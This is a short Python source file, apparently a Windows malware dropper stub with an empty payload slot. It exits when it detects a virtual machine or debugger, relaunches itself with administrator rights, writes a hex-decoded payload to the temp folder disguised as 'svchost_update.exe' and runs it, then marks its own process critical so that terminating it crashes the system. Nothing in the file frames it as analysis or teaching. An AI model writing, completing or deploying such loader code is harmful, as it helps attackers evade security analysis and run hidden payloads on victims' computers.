
import sys, os, subprocess, binascii, tempfile, ctypes, time

PAYLOAD = ""

def run():
    try:
        # Anti-VM
        if 1:
            drivers = ["vboxguest.sys", "vmtoolsd.exe"]
            try:
                out = subprocess.check_output("tasklist", shell=True).decode()
                if any(d in out.lower() for d in drivers): sys.exit()
            except: pass
            
        # Anti-Debug
        if 1:
            if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit()

        # UAC
        if 1 and not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()

        # Payload
        raw = binascii.unhexlify(PAYLOAD)
        tmp = tempfile.gettempdir()
        path = os.path.join(tmp, "svchost_update.exe")
        
        with open(path, "wb") as f:
            f.write(raw)

        subprocess.Popen(path, shell=True)
        
        # Critical
        if 1:
             ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)

    except: pass

if __name__ == "__main__":
    run()
